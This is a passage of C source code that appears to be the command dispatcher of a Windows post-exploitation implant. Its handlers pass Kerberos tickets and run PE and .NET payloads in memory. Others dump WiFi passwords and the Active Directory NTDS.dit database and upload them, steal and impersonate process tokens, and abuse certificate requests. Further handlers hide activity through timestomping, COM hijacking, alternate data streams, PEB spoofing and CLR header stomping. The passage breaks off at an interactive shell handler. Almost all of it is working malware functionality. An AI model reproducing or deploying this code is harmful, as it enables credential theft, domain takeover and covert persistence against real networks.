                    for (int i = 0; lname[i]; i++) lname[i] = (char)tolower((unsigned char)lname[i]);
                    if (strstr(lname, "clr") || strstr(lname, "mscor")) {
                        BYTE *base2 = (BYTE*)me.modBaseAddr;
                        if (base2 && base2[0] == 0x4D && base2[1] == 0x5A) {
                            DWORD old = 0;
                            VirtualProtect(base2, 2, PAGE_READWRITE, &old);
                            base2[0] = 0; base2[1] = 0;
                            VirtualProtect(base2, 2, old, &old);
                            stomped++;
                        }
                    }
                } while (Module32Next(snap, &me));
            }
            CloseHandle(snap);
        }
        char msg[128];
        snprintf(msg, sizeof(msg), "[+] stomped %d CLR module header(s)", stomped);
        agent_send_result(task->id, msg, "");
    }
    else if (strcmp(type_upper, "KERB_LIST") == 0) {
        char *out = kerb_list_tickets();
        agent_send_result(task->id, out, "");
        free(out);
    }
    else if (strcmp(type_upper, "KERB_PTT") == 0) {
        if (!args || !args[0]) {
            agent_send_result(task->id, "", "KERB_PTT: base64-encoded kirbi ticket required");
            return;
        }
        char *out = kerb_pass_ticket(args);
        agent_send_result(task->id, out, "");
        free(out);
    }
    else if (strcmp(type_upper, "KERB_PURGE") == 0) {
        char *out = kerb_purge();
        agent_send_result(task->id, out, "");
        free(out);
    }
    else if (strcmp(type_upper, "EXEC_PE") == 0) {
        if (!task->payload || task->payload_len == 0) {
            agent_send_result(task->id, "", "EXEC_PE: no PE payload"); return;
        }
        char *out = exec_pe(task->payload, task->payload_len);
        agent_send_result(task->id, out, ""); free(out);
    }
    else if (strcmp(type_upper, "DOTNET_EXEC") == 0) {
        // args JSON: {"asm":"<base64>","args":"<string>","type":"","method":""}
        const char *jargs = task->args ? task->args : "";
        // Extract "asm" field via pointer arithmetic (value can be many MB)
        const char *asm_tag = strstr(jargs, "\"asm\"");
        if (!asm_tag) { agent_send_result(task->id, "", "DOTNET_EXEC: missing asm field"); return; }
        const char *q1 = strchr(asm_tag + 5, '"'); // opening quote of value
        if (!q1) { agent_send_result(task->id, "", "DOTNET_EXEC: malformed asm field"); return; }
        q1++;
        const char *q2 = strchr(q1, '"');
        if (!q2 || q2 == q1) { agent_send_result(task->id, "", "DOTNET_EXEC: empty asm"); return; }
        size_t b64len = (size_t)(q2 - q1);
        char *b64buf = (char*)malloc(b64len + 1);
        if (!b64buf) { agent_send_result(task->id, "", "DOTNET_EXEC: malloc asm"); return; }
        memcpy(b64buf, q1, b64len); b64buf[b64len] = '\0';
        size_t asm_len = 0;
        uint8_t *asm_bytes = b64_decode(b64buf, &asm_len);
        free(b64buf);
        if (!asm_bytes || asm_len < 2) {
            free(asm_bytes);
            agent_send_result(task->id, "", "DOTNET_EXEC: b64 decode failed"); return;
        }
        char asm_args[4096] = {0};
        json_get_str(jargs, "args", asm_args, sizeof(asm_args), "");
        int timeout_sec = json_get_int(jargs, "timeout_sec", 0);
        char *out = fork_run_assembly(asm_bytes, asm_len, asm_args, timeout_sec);
        free(asm_bytes);
        agent_send_result(task->id, out ? out : "(null output)", "");
        free(out);
    }
    else if (strcmp(type_upper, "WHOAMI") == 0) {
        char *out = run_shell("whoami /all");
        agent_send_result(task->id, out, ""); free(out);
    }
    else if (strcmp(type_upper, "IPCONFIG") == 0) {
        char *out = run_shell("ipconfig /all");
        agent_send_result(task->id, out, ""); free(out);
    }
    else if (strcmp(type_upper, "NETSTAT") == 0) {
        char *out = run_shell("netstat -ano");
        agent_send_result(task->id, out, ""); free(out);
    }
    else if (strcmp(type_upper, "NET_USE") == 0) {
        char share[512]="", user[128]="", pass[256]="";
        json_get_str(args,"share",share,sizeof(share),"");
        json_get_str(args,"user",user,sizeof(user),"");
        json_get_str(args,"pass",pass,sizeof(pass),"");
        char cmd[1024]; snprintf(cmd,sizeof(cmd),"net use \"%s\" \"%s\" /user:\"%s\" 2>&1",share,pass,user);
        char *out = run_shell(cmd); agent_send_result(task->id, out?out:"", ""); free(out);
    }
    else if (strcmp(type_upper, "NET_USE_DEL") == 0) {
        char cmd[512]; snprintf(cmd,sizeof(cmd),"net use \"%s\" /delete /yes 2>&1", args?args:"");
        char *out = run_shell(cmd); agent_send_result(task->id, out?out:"", ""); free(out);
    }
    else if (strcmp(type_upper, "ADCS_REQUEST") == 0) {
        char ca[256]="", tmpl[128]="", subj[256]="CN=user", san[256]="", out_path[512]="";
        json_get_str(args,"ca",ca,sizeof(ca),"");
        json_get_str(args,"template",tmpl,sizeof(tmpl),"");
        json_get_str(args,"subject",subj,sizeof(subj),"CN=user");
        json_get_str(args,"san",san,sizeof(san),"");
        json_get_str(args,"out",out_path,sizeof(out_path),"");
        DWORD pid = GetCurrentProcessId();
        char inf[MAX_PATH], csr[MAX_PATH];
        snprintf(inf,sizeof(inf),"C:\\Users\\Public\\adcs_%lu.inf",(unsigned long)pid);
        snprintf(csr,sizeof(csr),"C:\\Users\\Public\\adcs_%lu.csr",(unsigned long)pid);
        if (!out_path[0]) snprintf(out_path,sizeof(out_path),"C:\\Users\\Public\\adcs_%lu.cer",(unsigned long)pid);
        char inf_buf[2048];
        if (san[0])
            snprintf(inf_buf,sizeof(inf_buf),"[Version]\r\nSignature=\"$Windows NT$\"\r\n\r\n[NewRequest]\r\nSubject = \"%s\"\r\nKeySpec = 1\r\nKeyLength = 2048\r\nExportable = TRUE\r\nMachineKeySet = FALSE\r\nRequestType = CMC\r\n\r\n[RequestAttributes]\r\nCertificateTemplate=%s\r\nSAN=upn=%s\r\n",subj,tmpl,san);
        else
            snprintf(inf_buf,sizeof(inf_buf),"[Version]\r\nSignature=\"$Windows NT$\"\r\n\r\n[NewRequest]\r\nSubject = \"%s\"\r\nKeySpec = 1\r\nKeyLength = 2048\r\nExportable = TRUE\r\nMachineKeySet = FALSE\r\nRequestType = CMC\r\n\r\n[RequestAttributes]\r\nCertificateTemplate=%s\r\n",subj,tmpl);
        FILE *fp = fopen(inf,"wb"); if(fp){fputs(inf_buf,fp);fclose(fp);}
        char cmd1[1024], cmd2[1024];
        snprintf(cmd1,sizeof(cmd1),"certreq -new \"%s\" \"%s\" 2>&1",inf,csr);
        snprintf(cmd2,sizeof(cmd2),"certreq -submit -config \"%s\" \"%s\" \"%s\" 2>&1",ca,csr,out_path);
        char *o1 = run_shell(cmd1);
        char *o2 = run_shell(cmd2);
        /* read cert and base64 encode */
        char *cert_b64_line = (char*)calloc(1,1);
        FILE *cf = fopen(out_path,"rb");
        if (cf) {
            fseek(cf,0,SEEK_END); long csz=(long)ftell(cf); rewind(cf);
            if (csz>0) {
                uint8_t *cbuf=(uint8_t*)malloc(csz);
                if(cbuf && fread(cbuf,1,csz,cf)==(size_t)csz) {
                    char *b64=b64_encode(cbuf,csz);
                    if(b64){
                        size_t b64sz=strlen(b64);
                        free(cert_b64_line);
                        cert_b64_line=(char*)malloc(b64sz+16);
                        if(cert_b64_line) snprintf(cert_b64_line,b64sz+16,"\ncert_b64=%s",b64);
                        free(b64);
                    }
                }
                free(cbuf);
            }
            fclose(cf);
        }
        DeleteFileA(inf); DeleteFileA(csr);
        char *full = (char*)malloc(strlen(o1?o1:"")+strlen(o2?o2:"")+strlen(cert_b64_line)+4);
        if(full) sprintf(full,"%s\n%s%s",o1?o1:"",o2?o2:"",cert_b64_line);
        agent_send_result(task->id, full?full:"", "");
        free(o1); free(o2); free(cert_b64_line); free(full);
    }
    else if (strcmp(type_upper, "WHOAMI") == 0) {
        char *out = run_shell("whoami /all");
        agent_send_result(task->id, out?out:"", ""); free(out);
    }
    else if (strcmp(type_upper, "IPCONFIG") == 0) {
        char *out = run_shell("ipconfig /all");
        agent_send_result(task->id, out?out:"", ""); free(out);
    }
    // ── Phase 1 ──────────────────────────────────────────────────────────────
    else if (strcmp(type_upper, "TIMESTOMP") == 0) {
        char target[512]={0}; char ref[512]={0};
        if (args && args[0]=='{') {
            json_get_str(args,"target",target,sizeof(target),"");
            json_get_str(args,"ref",ref,sizeof(ref),"C:\\Windows\\System32\\kernel32.dll");
        } else if (args && args[0]) {
            char tmp[1024]; strncpy(tmp,args,sizeof(tmp)-1); tmp[sizeof(tmp)-1]=0;
            char *sp=strchr(tmp,' ');
            if(sp){*sp='\0'; strncpy(target,tmp,sizeof(target)-1); strncpy(ref,sp+1,sizeof(ref)-1);}
            else { strncpy(target,tmp,sizeof(target)-1); strncpy(ref,"C:\\Windows\\System32\\kernel32.dll",sizeof(ref)-1); }
        }
        if(!target[0]){agent_send_result(task->id,"","TIMESTOMP: usage: timestomp <target> [ref]");return;}
        HANDLE hRef=CreateFileA(ref,GENERIC_READ,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL|FILE_FLAG_BACKUP_SEMANTICS,NULL);
        if(hRef==INVALID_HANDLE_VALUE){agent_send_result(task->id,"","TIMESTOMP: cannot open ref");return;}
        FILETIME ctime,atime,mtime; GetFileTime(hRef,&ctime,&atime,&mtime); CloseHandle(hRef);
        HANDLE hDst=CreateFileA(target,FILE_WRITE_ATTRIBUTES,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL|FILE_FLAG_BACKUP_SEMANTICS,NULL);
        if(hDst==INVALID_HANDLE_VALUE){agent_send_result(task->id,"","TIMESTOMP: cannot open target");return;}
        SetFileTime(hDst,&ctime,&atime,&mtime); CloseHandle(hDst);
        char msg[600]; snprintf(msg,sizeof(msg),"[+] timestamps cloned from %s to %s",ref,target);
        agent_send_result(task->id,msg,"");
    }
    else if (strcmp(type_upper, "COM_HIJACK") == 0) {
        char clsid[128]={0}; char dllpath[512]={0};
        json_get_str(args,"clsid",clsid,sizeof(clsid),""); json_get_str(args,"path",dllpath,sizeof(dllpath),"");
        if(!clsid[0]||!dllpath[0]){agent_send_result(task->id,"","COM_HIJACK: {\"clsid\":\"...\",\"path\":\"...\"} required");return;}
        char keypath[300]; snprintf(keypath,sizeof(keypath),"Software\\Classes\\CLSID\\{%s}\\InprocServer32",clsid);
        HKEY hk;
        if(RegCreateKeyExA(HKEY_CURRENT_USER,keypath,0,NULL,0,KEY_SET_VALUE,NULL,&hk,NULL)!=ERROR_SUCCESS){agent_send_result(task->id,"","COM_HIJACK: RegCreateKeyEx failed");return;}
        RegSetValueExA(hk,"",0,REG_SZ,(const BYTE*)dllpath,(DWORD)strlen(dllpath)+1);
        RegSetValueExA(hk,"ThreadingModel",0,REG_SZ,(const BYTE*)"Apartment",10); RegCloseKey(hk);
        char msg[700]; snprintf(msg,sizeof(msg),"[+] COM hijack: HKCU\\%s -> %s",keypath,dllpath);
        agent_send_result(task->id,msg,"");
    }
    else if (strcmp(type_upper, "COM_HIJACK_RM") == 0) {
        char clsid[128]={0}; json_get_str(args,"clsid",clsid,sizeof(clsid),"");
        if(!clsid[0]){agent_send_result(task->id,"","COM_HIJACK_RM: {\"clsid\":\"...\"} required");return;}
        char keypath[256]; snprintf(keypath,sizeof(keypath),"Software\\Classes\\CLSID\\{%s}",clsid);
        RegDeleteTreeA(HKEY_CURRENT_USER,keypath);
        agent_send_result(task->id,"[+] COM hijack removed","");
    }
    else if (strcmp(type_upper, "CLIP_GET") == 0) {
        if(!OpenClipboard(NULL)){agent_send_result(task->id,"","CLIP_GET: OpenClipboard failed");return;}
        HANDLE hData=GetClipboardData(CF_TEXT);
        if(!hData){CloseClipboard();agent_send_result(task->id,"","CLIP_GET: no text in clipboard");return;}
        char *text=(char*)GlobalLock(hData);
        if(!text){CloseClipboard();agent_send_result(task->id,"","CLIP_GET: GlobalLock failed");return;}
        char *copy=_strdup(text); GlobalUnlock(hData); CloseClipboard();
        agent_send_result(task->id,copy?copy:"",""); free(copy);
    }
    else if (strcmp(type_upper, "CRED_WIFI") == 0 || strcmp(type_upper, "WIFI_CREDS") == 0) {
        char *profiles_out=run_shell("netsh wlan show profiles 2>&1");
        if(!profiles_out){agent_send_result(task->id,"","CRED_WIFI: netsh failed");return;}
        char *combined=(char*)calloc(1,65536);
        if(!combined){free(profiles_out);agent_send_result(task->id,"","alloc failed");return;}
        char *p=profiles_out;
        while((p=strstr(p,"All User Profile"))!=NULL){
            char *colon=strchr(p,':'); if(!colon)break; colon++;
            while(*colon==' ')colon++;
            char name[256]; int i=0;
            while(*colon&&*colon!='\r'&&*colon!='\n'&&i<255)name[i++]=*colon++;
            name[i]=0;
            char cmd[512]; snprintf(cmd,sizeof(cmd),"netsh wlan show profile name=\"%s\" key=clear 2>&1",name);
            char *detail=run_shell(cmd);
            if(detail){size_t cl=strlen(combined),dl=strlen(detail);if(cl+dl<65534){memcpy(combined+cl,detail,dl);combined[cl+dl]=0;}free(detail);}
            p=colon;
        }
        free(profiles_out);
        agent_send_result(task->id,combined[0]?combined:"[no WiFi profiles found]",""); free(combined);
    }
    else if (strcmp(type_upper, "NTDS_DUMP") == 0) {
        char outdir[512]={0}; json_get_str(args,"path",outdir,sizeof(outdir),"C:\\Windows\\Temp\\ntds_ifm");
        char cmd[600]; snprintf(cmd,sizeof(cmd),"ntdsutil \"ac i ntds\" \"ifm\" \"create full %s\" q q 2>&1",outdir);
        char *out=run_shell(cmd);
        agent_send_result(task->id,out?out:"",out?"":" NTDS_DUMP: run failed"); free(out);
    }
    else if (strcmp(type_upper, "DCSYNC") == 0) {
        /* Extract ntds.dit + SYSTEM via IFM (default) or VSS; upload both for offline parsing.
           Args JSON: {"mode":"ifm|vss","out":"C:\\Users\\Public\\dcsync_out"}
           Offline: secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL */
        char dc_mode[16]="ifm", tmp_dir[MAX_PATH]="C:\\Users\\Public\\dcsync_out";
        json_get_str(args,"mode",dc_mode,sizeof(dc_mode),"ifm");
        json_get_str(args,"out",tmp_dir,sizeof(tmp_dir),"C:\\Users\\Public\\dcsync_out");
        char ntds_path[MAX_PATH], sys_path[MAX_PATH];
        char dc_err[512]="";
        int vss_ok = 0;

        if (strcmp(dc_mode,"vss")==0) {
            /* VSS shadow copy */
            char *vss_out = run_shell("vssadmin create shadow /for=C: 2>&1");
            char shadow[MAX_PATH]="";
            if (vss_out) {
                char *line = strtok(vss_out, "\n");
                while (line) {
                    if (strstr(line,"HarddiskVolumeShadowCopy") && strstr(line,"\\\\?\\")) {
                        char *tok = strstr(line,"\\\\?\\");
                        if (tok) { strncpy(shadow,tok,sizeof(shadow)-1); char *ep=shadow+strlen(shadow)-1; while(ep>shadow&&(*ep=='\r'||*ep=='\n'))  *ep--='\0'; break; }
                    }
                    line = strtok(NULL,"\n");
                }
                free(vss_out);
            }
            if (!shadow[0]) {
                snprintf(dc_err,sizeof(dc_err),"VSS shadow copy failed");
            } else {
                char c1[1024],c2[1024],c3[512];
                snprintf(c3,sizeof(c3),"mkdir \"%s\" 2>&1",tmp_dir);
                char *r3=run_shell(c3); free(r3);
                snprintf(c1,sizeof(c1),"copy \"%s\\Windows\\NTDS\\ntds.dit\" \"%s\\ntds.dit\" /Y 2>&1",shadow,tmp_dir);
                char *r1=run_shell(c1); free(r1);
                snprintf(c2,sizeof(c2),"copy \"%s\\Windows\\System32\\config\\SYSTEM\" \"%s\\SYSTEM\" /Y 2>&1",shadow,tmp_dir);
                char *r2=run_shell(c2); free(r2);
                snprintf(ntds_path,sizeof(ntds_path),"%s\\ntds.dit",tmp_dir);
                snprintf(sys_path, sizeof(sys_path), "%s\\SYSTEM",tmp_dir);
                vss_ok = 1;
            }
        } else {
            /* IFM: ntdsutil create full */
            char rmcmd[512]; snprintf(rmcmd,sizeof(rmcmd),"rmdir /S /Q \"%s\" 2>&1",tmp_dir);
            char *rr=run_shell(rmcmd); free(rr);
            char ifmcmd[600]; snprintf(ifmcmd,sizeof(ifmcmd),"ntdsutil \"ac i ntds\" \"ifm\" \"create full %s\" q q 2>&1",tmp_dir);
            char *ir=run_shell(ifmcmd); free(ir);
            snprintf(ntds_path,sizeof(ntds_path),"%s\\Active Directory\\ntds.dit",tmp_dir);
            snprintf(sys_path, sizeof(sys_path), "%s\\registry\\SYSTEM",tmp_dir);
            vss_ok = 1;
        }

        if (vss_ok && !dc_err[0]) {
            /* upload ntds.dit */
            FILE *f1=fopen(ntds_path,"rb");
            if (f1) {
                fseek(f1,0,SEEK_END); long sz1=(long)ftell(f1); rewind(f1);
                uint8_t *b1=(uint8_t*)malloc(sz1);
                if(b1&&fread(b1,1,sz1,f1)==(size_t)sz1) agent_upload_file(task->id,"ntds.dit",b1,sz1);
                free(b1); fclose(f1);
            } else snprintf(dc_err,sizeof(dc_err),"read ntds.dit failed");
            /* upload SYSTEM */
            FILE *f2=fopen(sys_path,"rb");
            if (f2) {
                fseek(f2,0,SEEK_END); long sz2=(long)ftell(f2); rewind(f2);
                uint8_t *b2=(uint8_t*)malloc(sz2);
                if(b2&&fread(b2,1,sz2,f2)==(size_t)sz2) agent_upload_file(task->id,"SYSTEM",b2,sz2);
                free(b2); fclose(f2);
            } else strncat(dc_err,"; read SYSTEM failed",sizeof(dc_err)-strlen(dc_err)-1);
            char rmcmd2[512]; snprintf(rmcmd2,sizeof(rmcmd2),"rmdir /S /Q \"%s\" 2>&1",tmp_dir);
            char *rr2=run_shell(rmcmd2); free(rr2);
            agent_send_result(task->id,"[+] DCSYNC: ntds.dit + SYSTEM uploaded. Run: secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL",dc_err);
        } else {
            agent_send_result(task->id,"",dc_err);
        }
    }
    // ── Phase 2a: ADS ─────────────────────────────────────────────────────────
    else if (strcmp(type_upper, "ADS_LIST") == 0) {
        if(!args||!args[0]){agent_send_result(task->id,"","ADS_LIST: path required");return;}
        wchar_t wpath[MAX_PATH]={0}; MultiByteToWideChar(CP_UTF8,0,args,-1,wpath,MAX_PATH);
        WIN32_FIND_STREAM_DATA sd; HANDLE hS=FindFirstStreamW(wpath,FindStreamInfoStandard,&sd,0);
        if(hS==INVALID_HANDLE_VALUE){agent_send_result(task->id,"","ADS_LIST: FindFirstStreamW failed");return;}
        char result[8192]={0}; int rlen=0;
        do { char sname[512]={0}; WideCharToMultiByte(CP_UTF8,0,sd.cStreamName,-1,sname,sizeof(sname),NULL,NULL);
             int w=snprintf(result+rlen,sizeof(result)-rlen-1,"%s\t%lld bytes\n",sname,sd.StreamSize.QuadPart);
             if(w>0)rlen+=w; } while(FindNextStreamW(hS,&sd));
        FindClose(hS); agent_send_result(task->id,result[0]?result:"[no alternate streams]","");
    }
    else if (strcmp(type_upper, "ADS_READ") == 0) {
        /* args = "file:stream" (Go-compatible plain string) */
        char *colon = args ? strrchr(args, ':') : NULL;
        if(!colon||colon==args){agent_send_result(task->id,"","ADS_READ: <file>:<stream> required");return;}
        char file[512]={0}; char stream[256]={0};
        int flen=(int)(colon-args); if(flen>=512)flen=511;
        strncpy(file,args,flen); strncpy(stream,colon+1,sizeof(stream)-1);
        char adspath[800]; snprintf(adspath,sizeof(adspath),"%s:%s",file,stream);
        HANDLE hF=CreateFileA(adspath,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
        if(hF==INVALID_HANDLE_VALUE){agent_send_result(task->id,"","ADS_READ: open failed");return;}
        DWORD fsz=GetFileSize(hF,NULL); uint8_t *buf=(uint8_t*)malloc(fsz+1);
        DWORD rd=0; ReadFile(hF,buf,fsz,&rd,NULL); CloseHandle(hF); buf[rd]=0;
        agent_upload_file(task->id,stream,buf,rd);
        char msg[64]; snprintf(msg,sizeof(msg),"[+] ADS read %lu bytes",rd);
        agent_send_result(task->id,msg,""); free(buf);
    }
    else if (strcmp(type_upper, "ADS_WRITE") == 0) {
        /* args = "file:stream", payload = raw bytes */
        char *colon = args ? strrchr(args, ':') : NULL;
        if(!colon||colon==args||!task->payload||task->payload_len==0){agent_send_result(task->id,"","ADS_WRITE: <file>:<stream> required (payload=data)");return;}
        char file[512]={0}; char stream[256]={0};
        int flen=(int)(colon-args); if(flen>=512)flen=511;
        strncpy(file,args,flen); strncpy(stream,colon+1,sizeof(stream)-1);
        char adspath[800]; snprintf(adspath,sizeof(adspath),"%s:%s",file,stream);
        HANDLE hF=CreateFileA(adspath,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
        if(hF==INVALID_HANDLE_VALUE){agent_send_result(task->id,"","ADS_WRITE: create failed");return;}
        DWORD wr=0; WriteFile(hF,task->payload,(DWORD)task->payload_len,&wr,NULL); CloseHandle(hF);
        char msg[64]; snprintf(msg,sizeof(msg),"[+] wrote %lu bytes to %s",wr,adspath);
        agent_send_result(task->id,msg,"");
    }
    else if (strcmp(type_upper, "ADS_DEL") == 0) {
        char *colon = args ? strrchr(args, ':') : NULL;
        if(!colon||colon==args){agent_send_result(task->id,"","ADS_DEL: <file>:<stream> required");return;}
        char file[512]={0}; char stream[256]={0};
        int flen=(int)(colon-args); if(flen>=512)flen=511;
        strncpy(file,args,flen); strncpy(stream,colon+1,sizeof(stream)-1);
        char adspath[800]; snprintf(adspath,sizeof(adspath),"%s:%s",file,stream);
        if(DeleteFileA(adspath))agent_send_result(task->id,"[+] ADS stream deleted","");
        else agent_send_result(task->id,"","ADS_DEL: DeleteFile failed");
    }
    // ── Phase 2d: Screenwatch ─────────────────────────────────────────────────
    else if (strcmp(type_upper, "SCREENWATCH_START") == 0) {
        if(!g_sw_stop){agent_send_result(task->id,"","screenwatch already running");return;}
        g_sw_interval=json_get_int(args,"interval",10); if(g_sw_interval<1)g_sw_interval=1;
        g_sw_task_id=task->id; g_sw_last_tick=0; g_sw_frame=0; g_sw_stop=0;
        char msg[64]; snprintf(msg,sizeof(msg),"[+] screenwatch started (interval %ds)",g_sw_interval);
        agent_send_result(task->id,msg,"");
    }
    else if (strcmp(type_upper, "SCREENWATCH_STOP") == 0) {
        if(g_sw_stop){agent_send_result(task->id,"","screenwatch not running");return;}
        g_sw_stop=1; g_sw_frame=0;
        agent_send_result(task->id,"[+] screenwatch stopped","");
    }
    // ── FEATURE 1: Token store ────────────────────────────────────────────────
    else if (strcmp(type_upper, "TOKEN_STORE_STEAL") == 0) {
        int tpid = json_get_int(args, "pid", 0);
        if (!tpid) { agent_send_result(task->id,"","TOKEN_STORE_STEAL: pid required"); return; }
        if (g_token_count >= 32) { agent_send_result(task->id,"","token store full"); return; }
        HANDLE hSelf2;
        if (OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&hSelf2)) {
            enable_privilege(hSelf2,"SeDebugPrivilege"); CloseHandle(hSelf2);
        }
        HANDLE hP = OpenProcess(PROCESS_QUERY_INFORMATION,FALSE,(DWORD)tpid);
        if (!hP) {
            char e[64]; snprintf(e,sizeof(e),"OpenProcess failed (err %lu)",GetLastError());
            agent_send_result(task->id,"",e); return;
        }
        HANDLE hTk;
        if (!OpenProcessToken(hP,TOKEN_DUPLICATE|TOKEN_QUERY,&hTk)) {
            CloseHandle(hP);
            char e[64]; snprintf(e,sizeof(e),"OpenProcessToken failed (err %lu)",GetLastError());
            agent_send_result(task->id,"",e); return;
        }
        CloseHandle(hP);
        HANDLE hDp;
        if (!DuplicateTokenEx(hTk,TOKEN_ALL_ACCESS,NULL,SecurityImpersonation,
                              TokenImpersonation,&hDp)) {
            CloseHandle(hTk);
            char e[64]; snprintf(e,sizeof(e),"DuplicateTokenEx failed (err %lu)",GetLastError());
            agent_send_result(task->id,"",e); return;
        }
        CloseHandle(hTk);
        char uname[128] = "unknown";
        DWORD need2 = 0;
        GetTokenInformation(hDp,TokenUser,NULL,0,&need2);
        if (need2) {
            TOKEN_USER *tu = (TOKEN_USER*)malloc(need2);
            if (tu && GetTokenInformation(hDp,TokenUser,tu,need2,&need2)) {
                SID_NAME_USE snu;
                char dom[128]; DWORD dsz=sizeof(dom), usz=sizeof(uname);
                LookupAccountSidA(NULL,tu->User.Sid,uname,&usz,dom,&dsz,&snu);
            }
            free(tu);
        }
        TokenEntry *te = &g_tokens[g_token_count++];
        te->id = g_token_next_id++;
        te->pid = (DWORD)tpid;
        strncpy(te->user,uname,sizeof(te->user)-1);
        te->token = hDp;
        char out2[256];
        snprintf(out2,sizeof(out2),"[+] token stored: id=%d pid=%d user=%s",te->id,tpid,te->user);
        agent_send_result(task->id,out2,"");
    }
    else if (strcmp(type_upper, "TOKEN_STORE_SHOW") == 0) {
        if (g_token_count == 0) { agent_send_result(task->id,"(empty)",""); return; }
        char *tbuf = (char*)malloc((size_t)g_token_count * 256 + 16);
        if (!tbuf) { agent_send_result(task->id,"","oom"); return; }
        tbuf[0] = '\0';
        for (int ti = 0; ti < g_token_count; ti++) {
            char line2[256];
            snprintf(line2,sizeof(line2),"id=%d pid=%lu user=%s\n",
                g_tokens[ti].id,(unsigned long)g_tokens[ti].pid,g_tokens[ti].user);
            strcat(tbuf,line2);
        }
        agent_send_result(task->id,tbuf,""); free(tbuf);
    }
    else if (strcmp(type_upper, "TOKEN_STORE_USE") == 0) {
        int tid2 = json_get_int(args,"id",0);
        for (int ti = 0; ti < g_token_count; ti++) {
            if (g_tokens[ti].id == tid2) {
                if (!ImpersonateLoggedOnUser(g_tokens[ti].token)) {
                    char e[64]; snprintf(e,sizeof(e),"ImpersonateLoggedOnUser failed %lu",GetLastError());
                    agent_send_result(task->id,"",e);
                } else {
                    char out3[128];
                    snprintf(out3,sizeof(out3),"[+] impersonating id=%d user=%s",tid2,g_tokens[ti].user);
                    agent_send_result(task->id,out3,"");
                }
                return;
            }
        }
        agent_send_result(task->id,"","token id not found");
    }
    else if (strcmp(type_upper, "TOKEN_STORE_REMOVE") == 0) {
        int tid3 = json_get_int(args,"id",0);
        for (int ti = 0; ti < g_token_count; ti++) {
            if (g_tokens[ti].id == tid3) {
                CloseHandle(g_tokens[ti].token);
                for (int tj = ti; tj < g_token_count-1; tj++)
                    g_tokens[tj] = g_tokens[tj+1];
                g_token_count--;
                agent_send_result(task->id,"[+] token removed",""); return;
            }
        }
        agent_send_result(task->id,"","token id not found");
    }
    else if (strcmp(type_upper, "TOKEN_STORE_CLEAR") == 0) {
        for (int ti = 0; ti < g_token_count; ti++)
            CloseHandle(g_tokens[ti].token);
        g_token_count = 0;
        agent_send_result(task->id,"[+] token store cleared","");
    }
    // ── FEATURE 2: BLOCKDLLS ─────────────────────────────────────────────────
    else if (strcmp(type_upper, "BLOCKDLLS") == 0) {
        typedef BOOL (WINAPI *pfnSPMP)(DWORD, PVOID, SIZE_T);
        HMODULE hk32 = GetModuleHandleA("kernel32.dll");
        pfnSPMP fn_spmp = hk32 ? (pfnSPMP)GetProcAddress(hk32,"SetProcessMitigationPolicy") : NULL;
        if (!fn_spmp) { agent_send_result(task->id,"","SetProcessMitigationPolicy not found"); return; }
        DWORD policy_val = 1; /* MicrosoftSignedOnly bit */
        if (fn_spmp(8 /*ProcessSignaturePolicy*/, &policy_val, sizeof(policy_val))) {
            agent_send_result(task->id,"[+] BLOCKDLLS enabled","");
        } else {
            char e[64]; snprintf(e,sizeof(e),"SetProcessMitigationPolicy failed %lu",GetLastError());
            agent_send_result(task->id,"",e);
        }
    }
    // ── FEATURE 3: PEB_SPOOF ─────────────────────────────────────────────────
    else if (strcmp(type_upper, "PEB_SPOOF") == 0) {
        char peb_path[MAX_PATH] = {0};
        json_get_str(args,"path",peb_path,sizeof(peb_path),"C:\\Windows\\System32\\svchost.exe");
        typedef NTSTATUS (WINAPI *pfnNtQIP)(HANDLE,ULONG,PVOID,ULONG,PULONG);
        pfnNtQIP NtQIP2 = (pfnNtQIP)resolve_fn(H_NT_NtQueryInformationProcess);
        if (!NtQIP2) { agent_send_result(task->id,"","NTQIP unavailable"); return; }
        PROCESS_BASIC_INFORMATION pbi2 = {0};
        ULONG rlen2 = 0;
        NTSTATUS pst = NtQIP2(GetCurrentProcess(),0,&pbi2,sizeof(pbi2),&rlen2);
        if (!NT_SUCCESS(pst)) {
            char e[64]; snprintf(e,sizeof(e),"NtQIP failed 0x%lx",(unsigned long)pst);
            agent_send_result(task->id,"",e); return;
        }
        PEB *peb2 = pbi2.PebBaseAddress;
        RTL_USER_PROCESS_PARAMETERS *pp = peb2->ProcessParameters;
        WCHAR wpath2[MAX_PATH] = {0};
        int wlen2 = MultiByteToWideChar(CP_ACP,0,peb_path,-1,wpath2,MAX_PATH) - 1;
        if (wlen2 <= 0) { agent_send_result(task->id,"","MultiByteToWideChar failed"); return; }
        size_t wbytes2 = (size_t)(wlen2+1)*sizeof(WCHAR);
        WCHAR *nbuf = (WCHAR*)VirtualAlloc(NULL,wbytes2,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
        if (!nbuf) { agent_send_result(task->id,"","VirtualAlloc failed"); return; }
        memcpy(nbuf,wpath2,wbytes2);
        DWORD oprot;
        VirtualProtect(&pp->ImagePathName,sizeof(UNICODE_STRING),PAGE_READWRITE,&oprot);
        pp->ImagePathName.Length      = (USHORT)(wlen2*sizeof(WCHAR));
        pp->ImagePathName.MaximumLength = (USHORT)wbytes2;
        pp->ImagePathName.Buffer      = nbuf;
        VirtualProtect(&pp->ImagePathName,sizeof(UNICODE_STRING),oprot,&oprot);
        VirtualProtect(&pp->CommandLine,sizeof(UNICODE_STRING),PAGE_READWRITE,&oprot);
        pp->CommandLine.Length        = (USHORT)(wlen2*sizeof(WCHAR));
        pp->CommandLine.MaximumLength = (USHORT)wbytes2;
        pp->CommandLine.Buffer        = nbuf;
        VirtualProtect(&pp->CommandLine,sizeof(UNICODE_STRING),oprot,&oprot);
        char out4[512]; snprintf(out4,sizeof(out4),"[+] PEB spoofed to %s",peb_path);
        agent_send_result(task->id,out4,"");
    }
    // ── FEATURE 4: Interactive shell ─────────────────────────────────────────
    else if (strcmp(type_upper, "ISHELL_OPEN") == 0) {
        if (g_ishell_proc) {
